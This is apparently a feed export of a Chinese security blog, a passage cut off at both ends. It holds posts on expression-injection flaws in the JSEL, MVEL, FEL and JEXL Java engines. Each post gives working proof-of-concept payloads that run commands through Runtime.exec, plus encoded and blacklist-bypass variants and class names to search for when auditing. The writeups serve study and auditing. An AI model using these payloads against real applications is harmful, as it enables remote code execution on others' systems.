class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.xidea.el.Expression;</span><br><span class="line"><span class="keyword">import</span> org.xidea.el.impl.ExpressionImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String exp = <span class="string">"''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')"</span>;</span><br><span class="line">        <span class="comment">// String exp = "123.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')";</span></span><br><span class="line">        Expression expression = <span class="keyword">new</span> ExpressionImpl(exp);</span><br><span class="line">        System.out.println(expression.evaluate());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2020/04/11/浅析JSEL表达式注入漏洞/1.png" alt=""></p><h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><p>绕过技巧同SpEL注入中的反射利用技巧，这里不再赘述。</p><p>字符串中支持Unicode编码和八进制。</p><p>Unicode：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Unicode: &apos;&apos;.getClass().forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&apos;calc&apos;)</span><br><span class="line">\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0027\u0063\u0061\u006c\u0063\u0027\u0029</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析JSEL表达式注入漏洞/2.png" alt=""></p><p>八进制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.getClass().forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&apos;c\141lc&apos;)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析JSEL表达式注入漏洞/3.png" alt=""></p><h2 id="0x05-排查方法"><a href="#0x05-排查方法" class="headerlink" title="0x05 排查方法"></a>0x05 排查方法</h2><p>搜索关键类方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.xidea.el.impl.ExpressionImpl</span><br><span class="line">org.xidea.el.Expression.evaluate()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="JSEL注入" scheme="https://www.mi1k7ea.com/tags/JSEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析MvEL表达式注入漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/04/11/%E6%B5%85%E6%9E%90MvEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/04/11/浅析MvEL表达式注入漏洞/</id>
    <published>2020-04-11T10:35:05.000Z</published>
    <updated>2020-04-11T12:25:16.337Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>MVEL为MVFLEX Expression Language（MVFLEX表达式语言）的缩写，是一个功能强大的基于Java应用程序的表达式语言。MVEL运行时提供给使用者两种使用模式——解释模式和变异模式。解释模式是一种无状态的即时编译并执行的特殊模式，不会产生中间产物，但是表达式执行的速度会减慢。编译模式会产生大量的变异中间产物，用于缓存和预执行，但是执行速度比解释模式更快。</p><p>最新的版本是2.0，具有以下特性：</p><ol><li>动态JIT优化器。当负载超过一个确保代码产生的阈值时，选择性地产生字节代码,这大大减少了内存的使用量。<br>新的静态类型检查和属性支持，允许集成类型安全表达。</li><li>错误报告的改善。包括行和列的错误信息。</li><li>新的脚本语言特征。MVEL2.0 包含函数定义，如：闭包，lambda定义，标准循环构造(for, while, do-while, do-until…)，空值安全导航操作，内联with-context运营 ，易变的（isdef）的测试运营等等。</li><li>改进的集成功能。迎合主流的需求，MVEL2.0支持基础类型的个性化属性处理器，集成到JIT中。</li><li>更快的模板引擎，支持线性模板定义，宏定义和个性化标记定义。</li><li>新的交互式shell（MVELSH）。</li></ol><h2 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h2><p>具体语法可参考：<a href="http://mvel.documentnode.com/" target="_blank" rel="noopener">http://mvel.documentnode.com/</a></p><ul><li>简单属性表达式：<code>user.name</code></li><li>多语句：<code>statement1;statement2;statement3</code></li><li>访问属性、静态字段：<code>user.getManager().getName();</code>简写<code>user.manager.name</code></li><li>可访问嵌套类：<code>org.xxx.Person$BodyPart</code></li><li>创建对象直接new：<code>new String(&quot;foo&quot;)</code></li></ul><h2 id="0x03-PoC"><a href="#0x03-PoC" class="headerlink" title="0x03 PoC"></a>0x03 PoC</h2><p>需要的jar包：mvel2-2.4.4.Final。</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.mvel2.MVEL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//        String exp = "java.lang.Runtime.getRuntime().exec('calc')";</span></span><br><span class="line">        String exp = <span class="string">"new java.lang.ProcessBuilder('calc').start()"</span>;</span><br><span class="line">        String result = MVEL.eval(exp, <span class="keyword">new</span> HashMap()).toString();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2020/04/11/浅析MvEL表达式注入漏洞/1.png" alt=""></p><h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><p>绕过技巧同SpEL注入中的反射利用技巧，这里不再赘述。</p><p>此外，字符串中还支持：</p><ul><li>Unicode编码</li><li>八进制编码（a-&gt;十进制数97-&gt;八进制数141-&gt;\141）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Unicode: java.lang.Runtime.getRuntime().exec(&apos;calc&apos;)</span><br><span class="line">\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0027\u0063\u0061\u006c\u0063\u0027\u0029</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析MvEL表达式注入漏洞/2.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 八进制: new java.lang.ProcessBuilder(&apos;calc&apos;).start()</span><br><span class="line">\156\145\167\40\152\141\166\141\56\154\141\156\147\56\120\162\157\143\145\163\163\102\165\151\154\144\145\162\50\47\143\141\154\143\47\51\56\163\164\141\162\164\50\51</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析MvEL表达式注入漏洞/3.png" alt=""></p><h2 id="0x05-排查方法"><a href="#0x05-排查方法" class="headerlink" title="0x05 排查方法"></a>0x05 排查方法</h2><p>搜索关键类方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">org.mvel.Mvel.eval()</span><br><span class="line">org.mvel.MVEL.executeExpression()</span><br><span class="line">org.mvel.MVEL.compileExpression()</span><br><span class="line">org.mvel2.MVEL.eval()</span><br><span class="line">org.mvel2.MVEL.execute()</span><br><span class="line">org.mvel2.MVELInterpretedRuntime.parse()</span><br><span class="line">org.mvel2.ast.ASTNode.getReducedValue()</span><br><span class="line">org.mvel2.ast.NewObjectNode.getReducedValueAccelerated()</span><br><span class="line">org.mvel2.PropertyAccessor.get()</span><br><span class="line">org.mvel2.compiler.ExecutableStatement.getValue()</span><br><span class="line">org.mvel2.compiler.ExecutableAccessor</span><br><span class="line">org.mvel2.optimizers.AccessorOptimizer</span><br><span class="line">org.mvel2.optimizers.dynamic.DynamicOptimizer.optimizeObjectCreation</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="MvEL注入" scheme="https://www.mi1k7ea.com/tags/MvEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析FEL表达式注入漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/04/11/%E6%B5%85%E6%9E%90FEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/04/11/浅析FEL表达式注入漏洞/</id>
    <published>2020-04-11T09:17:26.000Z</published>
    <updated>2020-04-11T10:34:45.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>FEL（Fast Expression Language），是一种开源表达式引擎，支持解析执行和编译执行，支持直接调用任何第三方类中的方法，这种功能使得FEL表达式可以具有Java代码一样的能力，虽然本身对一些危险函数进行了黑名单校验，但因存在遗漏从而造成任意代码执行。</p><h2 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h2><p>参考：<a href="https://wenku.baidu.com/view/b69fafb1c67da26925c52cc58bd63186bceb9236.html" target="_blank" rel="noopener">FEL表达式引擎</a></p><p>FEL语法及API很简单，语法与Java基本相同。</p><ul><li>访问数组、集合、Map：<code>foo[0]、foo[1][0]</code></li><li>调用静态方法：<code>$(&#39;Math&#39;).min(1,2)</code></li></ul><h2 id="0x03-安全管理器"><a href="#0x03-安全管理器" class="headerlink" title="0x03 安全管理器"></a>0x03 安全管理器</h2><p>安全管理器中通过黑名单来对危险方法进行过滤。</p><p>具体代码在FelBuilder这个类中，可以看到是对System、Runtime、Process、File、java.net、com.greenpineyu.fel.compile、com.greenpineyu.fel.security等类进行了黑名单限制：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FelBuilder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构建安全管理器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SecurityMgr <span class="title">newSecurityMgr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Set&lt;String&gt; disables = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">disables.add(System.class.getCanonicalName() + <span class="string">".*"</span>);</span><br><span class="line">disables.add(Runtime.class.getCanonicalName() + <span class="string">".*"</span>);</span><br><span class="line">disables.add(Process.class.getCanonicalName() + <span class="string">".*"</span>);</span><br><span class="line">disables.add(File.class.getCanonicalName() + <span class="string">".*"</span>);</span><br><span class="line">disables.add(<span class="string">"java.net.*"</span>);</span><br><span class="line">disables.add(<span class="string">"com.greenpineyu.fel.compile.*"</span>);</span><br><span class="line">disables.add(<span class="string">"com.greenpineyu.fel.security.*"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> RegexSecurityMgr(<span class="keyword">null</span>, disables);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">System.out.println(System.class.getCanonicalName());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-PoC"><a href="#0x04-PoC" class="headerlink" title="0x04 PoC"></a>0x04 PoC</h2><p>需要的jar包：fel-0.8、antlr-runtime-3.5.2，另外绕过中需要用到antlr-3.2.0.wso2v1和groovy。</p><p>FEL的RCE主要是通过其支持的<code>$</code>和<code>.</code>运算符触发，即通过<code>$(&#39;class&#39;).method</code>形式，调用类方法，比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.greenpineyu.fel.FelEngine;</span><br><span class="line"><span class="keyword">import</span> com.greenpineyu.fel.FelEngineImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        FelEngine felEngine = <span class="keyword">new</span> FelEngineImpl();</span><br><span class="line">        Object object = felEngine.eval(<span class="string">"$('java.lang.Runtime').getRuntime().exec('calc')"</span>);</span><br><span class="line">        System.out.println(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码正常执行会被FEL的安全管理器给过滤掉：</p><p><img src="/2020/04/11/浅析FEL表达式注入漏洞/1.png" alt=""></p><p>通过调试分析可知是安全管理器的黑名单过滤了：</p><p><img src="/2020/04/11/浅析FEL表达式注入漏洞/2.png" alt=""></p><h2 id="0x05-绕过"><a href="#0x05-绕过" class="headerlink" title="0x05 绕过"></a>0x05 绕过</h2><p>针对前面FEL自带的安全管理器机制进行绕过。</p><h3 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;javax.script.ScriptEngineManager.new&apos;).getEngineByName(&apos;JavaScript&apos;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;calc&apos;)&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析FEL表达式注入漏洞/3.png" alt=""></p><h3 id="antlr-build-Tool"><a href="#antlr-build-Tool" class="headerlink" title="antlr.build.Tool"></a>antlr.build.Tool</h3><p>本地测试需用到antlr-3.2.0.wso2v1.jar。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;antlr.build.Tool.new&apos;).system(&apos;calc&apos;)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析FEL表达式注入漏洞/4.png" alt=""></p><h3 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h3><p>本地测试用到：groovy-all-2.4.12.jar。</p><p>调用Groovy本身的执行类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;org.codehaus.groovy.runtime.ProcessGroovyMethods&apos;).execute(&apos;calc&apos;)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析FEL表达式注入漏洞/6.png" alt=""></p><p>调用Groovy中的antlr.build.Tool：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&apos;groovyjarjarantlr.build.Tool.new&apos;).system(&apos;calc&apos;)</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/浅析FEL表达式注入漏洞/5.png" alt=""></p><h2 id="0x06-排查方法"><a href="#0x06-排查方法" class="headerlink" title="0x06 排查方法"></a>0x06 排查方法</h2><p>搜索关键类方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.greenpineyu.fel.FelEngine.eval()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="FEL注入" scheme="https://www.mi1k7ea.com/tags/FEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析JEXL表达式注入漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/04/11/%E6%B5%85%E6%9E%90JEXL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/04/11/浅析JEXL表达式注入漏洞/</id>
    <published>2020-04-11T03:57:36.000Z</published>
    <updated>2020-04-11T09:13:32.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Java Expression Language（JEXL）是一个表达式语言引擎，可以用来在应用或者框架中使用。JEXL受Velocity和JSP标签库1.1（JSTL)）的影响而产生的。需要注意的是， JEXL并不是JSTL中的表达式语言的实现。</p><p>JEXL是一个库，旨在促进在用Java编写的应用程序和框架中实现动态和脚本的功能。</p><p>JEXL基于对JSTL表达式语言的一些扩展来实现的一种表达式，该扩展支持在shell脚本或ECMAScript中看到的大多数构造。</p><p>更多参考：<a href="http://commons.apache.org/proper/commons-jexl/" target="_blank" rel="noopener">http://commons.apache.org/proper/commons-jexl/</a></p><h2 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h2><p>参考：<a href="https://ridikuius.github.io/Apache-Commons-JEXL3-%E8%AF%AD%E6%B3%95/" target="_blank" rel="noopener">Apache Commons JEXL 语法</a></p><h2 id="0x03-PoC"><a href="#0x03-PoC" class="headerlink" title="0x03 PoC"></a>0x03 PoC</h2><p>需要的jar包：commons-jexl-2.1.1或commons-jexl3-3.1、commons-logging-1.2。</p><h3 id="jexl-2-x-系列PoC"><a href="#jexl-2-x-系列PoC" class="headerlink" title="jexl 2.x 系列PoC"></a>jexl 2.x 系列PoC</h3><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.jexl2.Expression;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.jexl2.JexlContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.jexl2.JexlEngine;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.jexl2.MapContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 创建JEXL表达式引擎对象</span></span><br><span class="line">        JexlEngine jexlEngine = <span class="keyword">new</span> JexlEngine();</span><br><span class="line">        <span class="comment">// 创建Context设置对象</span></span><br><span class="line">        JexlContext jexlContext = <span class="keyword">new</span> MapContext();</span><br><span class="line">        <span class="comment">//JEXL表达式为逻辑语句，这里写入弹计算器exp</span></span><br><span class="line">        String exp = <span class="string">"''.class.forName('java.lang.Runtime').getRuntime().exec('calc')"</span>;</span><br><span class="line">        <span class="comment">// 使用引擎创建表达式对象</span></span><br><span class="line">        Expression expression = jexlEngine.createExpression(exp);</span><br><span class="line">        <span class="comment">// 使用表达式对象进行计算</span></span><br><span class="line">        expression.evaluate(jexlContext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即触发：</p><p><img src="/2020/04/11/浅析JEXL表达式注入漏洞/1.png" alt=""></p><h3 id="jexl-3-x-系列PoC"><a href="#jexl-3-x-系列PoC" class="headerlink" title="jexl 3.x 系列PoC"></a>jexl 3.x 系列PoC</h3><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.jexl3.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 新建一个JEXL表达式引擎</span></span><br><span class="line">        JexlEngine jexlEngine = <span class="keyword">new</span> JexlBuilder().create();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// payload</span></span><br><span class="line"><span class="comment">//        String exp = "''.class.forName('java.lang.Runtime').getRuntime().exec('calc')";</span></span><br><span class="line">        <span class="comment">// 3.x ok; 2.x failed</span></span><br><span class="line">        String exp = <span class="string">"123.class.forName('java.lang.Runtime').getRuntime().exec('calc')"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用引擎创建表达式对象</span></span><br><span class="line">        JexlExpression jexlExpression = jexlEngine.createExpression(exp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建JEXL上下文环境</span></span><br><span class="line">        JexlContext jexlContext = <span class="keyword">new</span> MapContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行表达式并返回显示结果</span></span><br><span class="line">        Object object = jexlExpression.evaluate(jexlContext);</span><br><span class="line">        System.out.println(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可触发：</p><p><img src="/2020/04/11/浅析JEXL表达式注入漏洞/2.png" alt=""></p><h3 id="使用JEXL引擎解析执行加载的文件（3-x）"><a href="#使用JEXL引擎解析执行加载的文件（3-x）" class="headerlink" title="使用JEXL引擎解析执行加载的文件（3.x）"></a>使用JEXL引擎解析执行加载的文件（3.x）</h3><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.jexl3.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"test.jexl"</span>);</span><br><span class="line"></span><br><span class="line">        JexlEngine jexlEngine = <span class="keyword">new</span> JexlBuilder().create();</span><br><span class="line">        JexlScript jexlScript = jexlEngine.createScript(file);</span><br><span class="line"></span><br><span class="line">        Object object = jexlScript.execute(<span class="keyword">null</span>);</span><br><span class="line">        System.out.println(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.jexl：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.class.forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&apos;calc&apos;)</span><br></pre></td></tr></table></figure><p>运行即触发：</p><p><img src="/2020/04/11/浅析JEXL表达式注入漏洞/3.png" alt=""></p><h2 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04 绕过"></a>0x04 绕过</h2><h3 id="反射机制与字符拼接"><a href="#反射机制与字符拼接" class="headerlink" title="反射机制与字符拼接"></a>反射机制与字符拼接</h3><p>这部分和SpEL注入是一样的，可利用的类如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.script.ScriptEngineManager</span><br><span class="line">// antlr.jar</span><br><span class="line">antlr.build.Tool</span><br><span class="line">// groovy-all.jar</span><br><span class="line">groovyjarjarantlr.build.Tool</span><br><span class="line">org.codehaus.groovy.runtime.ProcessGroovyMethods</span><br></pre></td></tr></table></figure><h3 id="绕过getClass和forName"><a href="#绕过getClass和forName" class="headerlink" title="绕过getClass和forName"></a>绕过getClass和forName</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 绕过getClass，仅3.x</span><br><span class="line">1[&apos;Class&apos;].forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&apos;calc&apos;)</span><br><span class="line"></span><br><span class="line">// 绕过forName，2.x和3.x通杀</span><br><span class="line">new(&apos;java.lang.Thread&apos;).currentThread().getContextClassLoader().loadClass(&apos;java.lang.Runtime&apos;).getRuntime().exec(&apos;calc&apos;)</span><br></pre></td></tr></table></figure><h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p>JEXL表达式支持Unicode编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.class\u002eforName(&apos;java.lang\u002eRuntime&apos;).getRuntime().exec(&apos;calc&apos;)</span><br><span class="line">// 或者整个进行Unicode编码都是ok的</span><br><span 